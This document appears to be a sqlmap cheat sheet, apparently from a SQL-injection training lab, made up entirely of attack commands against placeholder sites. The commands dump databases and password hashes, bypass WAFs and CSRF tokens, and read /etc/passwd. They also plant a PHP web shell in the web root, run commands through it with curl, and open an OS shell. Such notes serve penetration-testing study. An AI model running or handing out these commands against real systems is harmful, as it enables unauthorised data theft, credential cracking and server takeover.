```
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

#copy as curl 
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'

#GET/POST
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
#specify injection spot with *
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test' 

#using requests
sqlmap -r req.txt

#custom
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

#alternative method 
sqlmap -u www.target.com --data='id=1' --method PUT

#TUNING
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
sqlmap -u www.example.com/?id=1 -v 3 --level=5


sqlmap -r request5 --level=5 --risk=3 -T flag5 --batch --dump -C content --hex
sqlmap -r request6 --level=5 --risk=3 -D testdb -T flag6 -C content -p col --prefix='`)' --batch --dump
sqlmap -r request7 --level=5 --risk=3 -T flag7 --batch --dump -C content --union-cols=5 --no-cast
sqlmap -r request8 --csrf-token="t0ken" --batch -D testdb -T flag8 -C content --dump --batch
sqlmap -r request9 --randomize="uid" --batch -D testdb -T flag9 -C content --batch --dump
sqlmap -r request10 -D testdb -T flag10 -C content --skip-waf --batch --dump
sqlmap -r request11 --tamper=between -D testdb -T flag11 -C content --batch --dump


#db enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
#tables 
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
#columns
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
#rows
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
#conditional enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
#schema
sqlmap -u "http://www.example.com/?id=1" --schema
#search
sqlmap -u "http://www.example.com/?id=1" --search -T user
sqlmap -u "http://www.example.com/?id=1" --search -C pass
#passwords and cracking
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
#csrf
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
#unique value
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
#calculated parameter
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
#WAF bypass
--skip-waf
#check for dba privs
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
#read files
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
#writing files
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
curl http://www.example.com/shell.php?cmd=ls+-la
#os commands
sqlmap -u "http://www.example.com/?id=1" --os-shell
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```